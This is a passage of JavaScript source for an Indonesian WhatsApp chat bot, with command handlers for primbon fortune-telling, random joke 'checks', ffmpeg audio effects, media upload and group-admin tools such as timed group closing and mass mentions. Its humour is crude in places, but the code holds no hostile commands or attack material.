if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
ryozingod.sendImage(m.chat, anu.message.image, `❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Simbol Tarot :* ${anu.message.simbol_tarot}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
case "fengshui": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tahun_lahir}\n❋々 *Gender :* ${anu.message.jenis_kelamin}\n❋々 *Angka Kua :* ${anu.message.angka_kua}\n❋々 *Kelompok :* ${anu.message.kelompok}\n❋々 *Karakter :* ${anu.message.karakter}\n❋々 *Sektor Baik :* ${anu.message.sektor_baik}\n❋々 *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case "haribaik": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Kala Tinantang :* ${anu.message.kala_tinantang}\n❋々 *Info :* ${anu.message.info}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "harisangar": case "taliwangke": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Info :* ${anu.message.info}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "harinaas": case "harisial": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Hari Lahir :* ${anu.message.hari_lahir}\n❋々 *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❋々 *Hari Naas :* ${anu.message.hari_naas}\n❋々 *Info :* ${anu.message.catatan}\n❋々 *Catatan :* ${anu.message.info}`)
}
break
case "nagahari": case "harinaga": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Hari Lahir :* ${anu.message.hari_lahir}\n❋々 *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❋々 *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "arahrejeki": case "arahrezeki": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Hari Lahir :* ${anu.message.hari_lahir}\n❋々 *tanggal Lahir :* ${anu.message.tgl_lahir}\n❋々 *Arah Rezeki :* ${anu.message.arah_rejeki}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "peruntungan": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2023\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "weton": case "wetonjawa": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Tanggal :* ${anu.message.tanggal}\n❋々 *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n❋々 *Watak Hari :* ${anu.message.watak_hari}\n❋々 *Naga Hari :* ${anu.message.naga_hari}\n❋々 *Jam Baik :* ${anu.message.jam_baik}\n❋々 *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case "sifat": case "karakter": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case "keberuntungan": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}`)
}
break
case "memancing": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 12, 1, 2023`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Tanggal :* ${anu.message.tgl_memancing}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "masasubur": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 12, 1, 2023, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break



case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'cekganteng':
case 'cekcantik':
case 'cekkaya':
case 'lesbicek':
case 'ceklesbi': {
inireact()
if (!q) return xgreply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var sangek = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
var sange = sangek[Math.floor(Math.random() * sangek.length)]
xgreply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
inireact()
if (!q) return xgreply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${prefix + command} Saya Jadi Istrinya Ryo Kun >////<`)
var kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
var kapankah = kapan[Math.floor(Math.random() * kapan.length)]
xgreply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
inireact()
if (!text) return xgreply(`Contoh: ${prefix + command} Vyaaa`)
xgreply(`${q} ${q} ${q} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah Wangynya rambut ${q} wangyy aku mau nyiumin aroma wangynya ${q} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus & pat-pat ~~ AAAAAH ${q} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${q} AAAAA LUCCUUUUUUUUUUUUUUU............ ${q} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${q} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${q} gw ... ${q} di laptop ngeliatin gw, ${q} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${q} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${q} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`)
}
break
case 'cekmati': {
inireact()
if (!text) return xgreply(`Yang Mau Lu Cek Siapa Bego?`)
apipanas = await axios.get(`https://api.agify.io/?name=${q}`)
                xgreply(`Nama : ${apipanas.data.name}\n*Mati Pada Umur :* ${apipanas.data.age} Tahun.\n\n\n‼️*Jangan percaya teks diatas, Soalnya mati gada yg tau.Cepet Cepet Tobat Ya Bro*`)
}
break
case 'bagaimana': {
inireact()
if (!text) return xgreply( `Example : ${prefix + command} cara agar menjadi cewe yang sesuai dengan tipe nya ryo >////<`)
var apa = ['Gatau juga sih', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab Pertanyaan Anda', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Alamak, pusing gweh', 'mending beli eskrim', 'Gimana yeee']
var kah = apa[Math.floor(Math.random() * apa.length)]
xgreply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break

case 'bisakah': {
inireact()
if (!text) return xgreply( `Example : ${prefix + command} saya menjadi orang yang cakep seperti ryo`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih ngga', 'g', 'gatau juga', 'ngga bakal bisa', 'gk']
var kah = apa[Math.floor(Math.random() * apa.length)]
xgreply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break

case 'apakah': {
inireact()
if (!text) return xgreply( `Example : ${prefix + command} ryo cakep`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih iya', 'Betul']
var kah = apa[Math.floor(Math.random() * apa.length)]
xgreply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break

//Voice
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
 inireact()
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
xgreply(mess.wait)
let media = await ryozingod.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return xgreply(err)
let buff = fs.readFileSync(ran)
ryozingod.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else xgreply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
xgreply(e)
}
break

case 'tourl': {
inireact()
    xgreply(mess.wait)
    let media = await ryozingod.downloadAndSaveMediaMessage(quoted)
    if (/image/.test(mime)) {
        let anu = await uptotelegra(media)
        xgreply(util.format(anu))
    } else if (!/image/.test(mime)) {
        let anu = await UploadFileUgu(media)
        xgreply(util.format(anu))
    }    
}
break

//Group Menu
case "resetlinkgc": case "revoke":{
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return xgreply('Khusus Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
await ryozingod.groupRevokeInvite(m.chat).then((res) => xgreply(`Sukses riset link group`)).catch((err) => xgreply(jsonformat(err)))
}
break
case 'infogc': {
if(!isGroup) return xgreply("Hanya bisa di dalam group")
let _meta = await ryozingod.groupMetadata(m.chat)
  console.log(_meta)
let _img = await ryozingod.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await ryozingod.sendMessage(m.chat,{
caption,
image: await getBuffer(_img)
},
{ quoted: m }
)
}
break
case  'getppgc':
	if (!isGroup) return 
	xgreply(mess.wait)
	try {
	var ppimg = await ryozingod.profilePictureUrl(m.chat, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await ryozingod.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
	break
case 'closegroup': {
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return xgreply('Khusus Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
if (!args[0]) return xgreply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
xgreply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
ryozingod.groupSettingUpdate(m.chat, 'announcement')
xgreply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup🙏\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break
case 'opengroup': {
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return xgreply('Khusus Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
if (!args[0]) return xgreply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
xgreply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
ryozingod.groupSettingUpdate(m.chat, 'not_announcement')
xgreply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break
case  'intro': {
if (!isGroup) return xgreply(mess.ingroup)
let teks = 'Member baru INTRO  :)\nNama lengkap:\nNama panggilan:\nHobi:\nUmur:\nGender:\nKelas:\nTinggi badan:\nBeratbadan :\nAgama:\nGolongan darah:\nStatus:\nNama pacar:\nJumlah mantan:\nNama mantan:\nNama bapak :\nNama ibu : \nNama kakak:\nKakak online:\nKakak kandung\tiri:\nJumlah kakak:\nNama adek:\nAdek online:\nAdek kandung\tiri:\nJumlah adek:\nNama kakek:\nKakek dari ayah :\nKakek dari ibu :\nNama nenek:\nNenek dari ayah :\nNenek dari ibu :\nNama bibi:\nBibi dari ayah :\nBibi dari ibu :\nNama paman:\nBibi dari ayah :\nBibi dari ibu :\nKTP:\nSIM:\nSTNK:\nBPKB:\nKK:\nAlamat rumah:\nRT:\nRW:\nKELURAHAN:\nKECAMATAN:\nKABUPATEN:\nKOTA:\nPROVINSI:\nPLANET:\nGALAXY:\nUNIVERSE:\nLANGIT:\nDARATAN:\nLAUTAN:\nKEPULAUAN:\nSAMUDRA:\nUKURAN SEPATU:\nUKURAN BAJU:\nUKURAN CELANA:\nLEBAR PINGGANG:\nPANJANG TANGAN:\nPANJANG KAKI:\nMAKANAN FAVORIT:\nMINUMAN FAVORIT:\nFILM FAVORIT:\nSINETRON FAVORIT:\nGAME FAVORIT:\nANIME FAVORIT:\nMANGA FAVORIT:\nMANHUA FAVORIT:\nMANHWA FAVORIT:\nCHANNEL YOUTUBE:\nINSTAGRAM:\nTWITTEER:\nFACEBOOK:\nMUSIC FAVORIT:\nSIFAT:\nSIKAP:\nZODIAK:\nTANGGAL LAHIR:\nMERK HP:\nMERK MOTOR:\nMERK MOBIL:\nTINGKAT RUMAH:\nALAMAT SEKOLAH:\nUkuran daleman:\nUkuran atasan :\nDiameter kepala :\nStatistik tubuh:\nDiameter perut :\nDiameter lengan :\nDiameter paha :\nDiameter lutut :\nDiameter betis:\nPanjang tangan :\nPanjang kaki :\nPanjang kepala :\nLebar hidung :\nCita cita :\nHobi :\nJenis hewanpeliharaan :\nNama hewan:\nDiameter rumah:\nWaifu:\nHusbu:\nLoli kesukaan :\nShota kesukaan :\nPunya brp teman :\nTeman online :\nTeman offline :\nTeman main game:\nTeman sekolah:\nTemen rumah:'
xgreply(teks)
}
break    
case 'hidetag':
if (!isGroup) return xgreply(mess.only.group)
if (!isGroupAdmins && !isOwner) return m.reply(mess.admin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
ryozingod.sendMessage(m.chat, { text: q ? q : '', mentions: mem }, {quoted: m})
break
case "tagall": {
if (!isOwner && !isAdmins) return xgreply(mess.admin)
if (!isGroup) return xgreply(mess.only.group)
if (!q) return xgreply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}hai bebban\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎